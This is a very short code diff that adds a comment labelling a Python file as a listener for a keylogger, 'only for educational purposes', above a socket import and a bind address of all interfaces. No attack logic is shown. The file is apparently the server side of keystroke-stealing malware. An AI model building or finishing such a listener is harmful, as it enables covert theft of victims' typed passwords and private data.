@@ -1,3 +1,5 @@
+# Listener for the Keylogger, only for educational purposes
+
 import socket
 
 TCP_IP = "0.0.0.0"  # Listen on all network interfaces
